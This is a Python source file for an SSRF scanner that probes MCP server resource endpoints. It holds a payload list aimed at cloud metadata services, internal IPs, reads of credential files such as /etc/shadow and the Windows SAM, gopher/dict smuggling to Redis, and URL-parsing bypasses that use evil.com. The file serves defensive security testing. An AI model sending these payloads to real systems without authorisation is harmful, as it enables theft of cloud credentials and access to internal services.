"""
Resource URI SSRF Scanner.

Tests MCP resource endpoints for Server-Side Request Forgery vulnerabilities.
MCP resources use URIs that servers fetch - if not properly validated, attackers
can make the server fetch internal resources or cloud metadata.
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any
import urllib.parse

from mcpsec.client.mcp_client import MCPSecClient
from mcpsec.models import Finding, ServerProfile, Severity
from mcpsec.scanners.base import BaseScanner
from mcpsec.scanners.oracles import OOBCollector

logger = logging.getLogger(__name__)


class ResourceSSRFScanner(BaseScanner):
    """Scans resource handlers for SSRF vulnerabilities."""

    name = "resource-ssrf"
    description = "Tests resource endpoints for Server-Side Request Forgery (SSRF)"

    def __init__(self, oob_host: str | None = None) -> None:
        self.oob_host = oob_host

    # SSRF test payloads
    SSRF_PAYLOADS = [
        # Cloud metadata endpoints
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
        ("aws_metadata_v2", "http://169.254.169.254/latest/api/token", "AWS EC2 IMDSv2"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance", "Azure metadata"),
        ("digitalocean_metadata", "http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
        ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
        # Internal services
        ("localhost_http", "http://localhost/", "Localhost HTTP"),
        ("localhost_port", "http://localhost:8080/", "Localhost common port"),
        ("localhost_admin", "http://localhost/admin", "Localhost admin"),
        ("internal_ip", "http://192.168.1.1/", "Internal network"),
        ("internal_10", "http://10.0.0.1/", "Internal 10.x network"),
        ("internal_172", "http://172.16.0.1/", "Internal 172.16.x network"),
        ("ipv6_localhost", "http://[::1]/", "IPv6 localhost"),
        ("ipv6_localhost_port", "http://[::1]:8080/", "IPv6 localhost with port"),
        # Protocol smuggling
        ("file_etc_passwd", "file:///etc/passwd", "Local file read (passwd)"),
        ("file_etc_shadow", "file:///etc/shadow", "Local file read (shadow)"),
        ("file_windows", "file:///c:/windows/system32/config/sam", "Windows SAM file"),
        ("dict_protocol", "dict://localhost:11211/stats", "Dict protocol (Memcached)"),
        ("gopher_redis", "gopher://localhost:6379/_INFO", "Gopher to Redis"),
        # URL parsing tricks
        ("url_bypass_at", "http://evil.com@localhost/", "@ symbol URL bypass"),
        ("url_bypass_hash", "http://localhost#@evil.com/", "Hash URL bypass"),
        ("url_encoded", "http://127.0.0.1%00.evil.com/", "Null byte injection"),
        ("decimal_ip", "http://2130706433/", "Decimal IP (127.0.0.1)"),
        ("octal_ip", "http://0177.0.0.1/", "Octal IP format"),
        ("hex_ip", "http://0x7f.0x0.0x0.0x1/", "Hex IP format"),
        # DNS rebinding setup markers
        ("dns_rebind", "http://localtest.me/", "DNS rebinding test domain"),
    ]

    # Indicators of successful SSRF
    SSRF_SUCCESS_INDICATORS = [
        # AWS metadata
        "ami-",
        "instance-id",
        "security-credentials",
        "iam/info",
        # GCP metadata
        "computeMetadata",
        "project/project-id",
        "instance/zone",
        # Azure metadata
        "vmId",
        "subscriptionId",
        "resourceGroupName",
        # File contents
        "root:x:0:0",
        "daemon:x:",
        "bin/bash",
        "bin/sh",
        # Windows
        "Administrator",
        "NTLM",
        "SAM",
        # Redis
        "redis_version",
        "connected_clients",
    ]

    async def scan(
        self, profile: ServerProfile, client: MCPSecClient | None = None
    ) -> list[Finding]:
        """Scan for SSRF vulnerabilities in resource handling."""
        findings = []

        if not profile.resources:
            return findings

        with OOBCollector(advertise_host=self.oob_host) as collector:
            # Find resources that might accept URIs
            for resource in profile.resources:
                uri = resource.uri
                name = resource.name or "unknown"

                # Check if this resource has parameterized URI template or looks like a fetcher
                if "{" in uri or self._looks_like_fetch_resource(resource):
                    # Static analysis finding first if not testing dynamically
                    if not client or not client.session:
                        findings.append(
                            Finding(
                                severity=Severity.MEDIUM,
                                scanner=self.name,
                                tool_name=name,
                                title="Resource may be vulnerable to SSRF",
                                description=f"Resource '{name}' accepts URI input - potential SSRF vector",
                                detail=f"URI Template: {uri}",
                                remediation="Validate and whitelist allowed URI schemes and hosts",
                            )
                        )
                        continue

                    # 1. Authoritative path: Out-of-band HTTP oracle
                    confirmed_oob = False
                    try:
                        token, probe_url = collector.new_probe()
                        if "{" in uri:
                            target_uri = re.sub(r"\{[^}]+\}", probe_url, uri)
                        else:
                            target_uri = probe_url

                        try:
                            await client.session.read_resource(target_uri)
                        except Exception:
                            pass

                        hit = collector.received(token, settle=2.0)
                        if hit is not None:
                            src_ip = hit.get("source_ip", "unknown")
                            method = hit.get("method", "GET")
                            path = hit.get("path", f"/{token}")
                            ts = hit.get("timestamp", time.time())
                            evidence = (
                                f"Out-of-band HTTP request received for token '{token}' from {src_ip} "
                                f"({method} {path} at {ts})"
                            )
                            findings.append(
                                Finding(
                                    severity=Severity.CRITICAL,
                                    scanner=self.name,
                                    tool_name=name,
                                    title=f"Resource SSRF in '{name}' [CONFIRMED]",
                                    description=f"Resource '{name}' fetched an out-of-band URL via resource read.",
                                    detail=f"Oracle: oob-http\nPayload: {probe_url}\nEvidence: {evidence}",
                                    evidence=evidence,
                                    confidence="confirmed",
                                    remediation="Implement strict URI validation, whitelist allowed schemes (https only), block internal IPs",
                                    cwe="CWE-918",
                                )
                            )
                            confirmed_oob = True
                    except Exception as e:
                        logger.debug(f"Error testing resource OOB SSRF: {e}")

                    if confirmed_oob:
                        continue

                    # 2. Secondary path: Test SSRF payloads dynamically with reflection guard
                    for payload_name, payload_uri, description in self.SSRF_PAYLOADS:
                        finding = await self._test_ssrf(
                            client, name, uri, payload_name, payload_uri, description
                        )
                        if finding:
                            findings.append(finding)
                            break

        return findings

    def _looks_like_fetch_resource(self, resource: Any) -> bool:
        """Heuristic: does this resource look like it fetches external URIs?"""
        name = (getattr(resource, "name", "") or "").lower()
        description = (getattr(resource, "description", "") or "").lower()

        fetch_indicators = ["fetch", "url", "http", "request", "download", "load", "get"]
        return any(ind in name or ind in description for ind in fetch_indicators)

    async def _test_ssrf(
        self,
        client: MCPSecClient,
        resource_name: str,
        uri_template: str,
        payload_name: str,
        payload_uri: str,
        description: str,
    ) -> Finding | None:
        """Test a single SSRF payload against a resource."""
        if not client.session:
            return None

        target_uri = (
            re.sub(r"\{[^}]+\}", payload_uri, uri_template) if "{" in uri_template else payload_uri
        )

        try:
            result = await client.session.read_resource(target_uri)

            if result:
                content_text = ""
                for content in result.contents:
                    if hasattr(content, "text"):
                        content_text += content.text
                    elif hasattr(content, "blob"):
                        content_text += str(content.blob)

                clean_text = content_text.replace(target_uri, "").replace(payload_uri, "")
                try:
                    decoded = urllib.parse.unquote(payload_uri)
                    if decoded != payload_uri:
                        clean_text = clean_text.replace(decoded, "")
                except Exception:
                    pass

                result_str = clean_text.lower()

                # Check for SSRF success indicators with reflection guard
                evidence = ""
                for indicator in self.SSRF_SUCCESS_INDICATORS:
                    ind_lower = indicator.lower()
                    if ind_lower in result_str:
                        # Reflection guard: if indicator is in the payload URI, ignore
                        if ind_lower in payload_uri.lower() or ind_lower in target_uri.lower():
                            continue
                        evidence = f"Matched indicator: '{indicator}'"
                        break

                if evidence:
                    return Finding(
                        severity=Severity.CRITICAL,
                        scanner=self.name,
                        tool_name=resource_name,
                        title="SSRF Vulnerability Confirmed",
                        description=f"Resource '{resource_name}' fetched internal/sensitive data via {description}",
                        detail=f"Payload: {target_uri}\nEvidence: {evidence}",
                        evidence=clean_text[:500],
                        confidence="confirmed",
                        remediation="Implement strict URI validation, whitelist allowed schemes (https only), block internal IPs",
                        cwe="CWE-918",
                    )

                # Bare response without matching indicator is NOT a finding
                return None

        except Exception as e:
            logger.debug(f"Error testing resource {resource_name}: {e}")

        return None

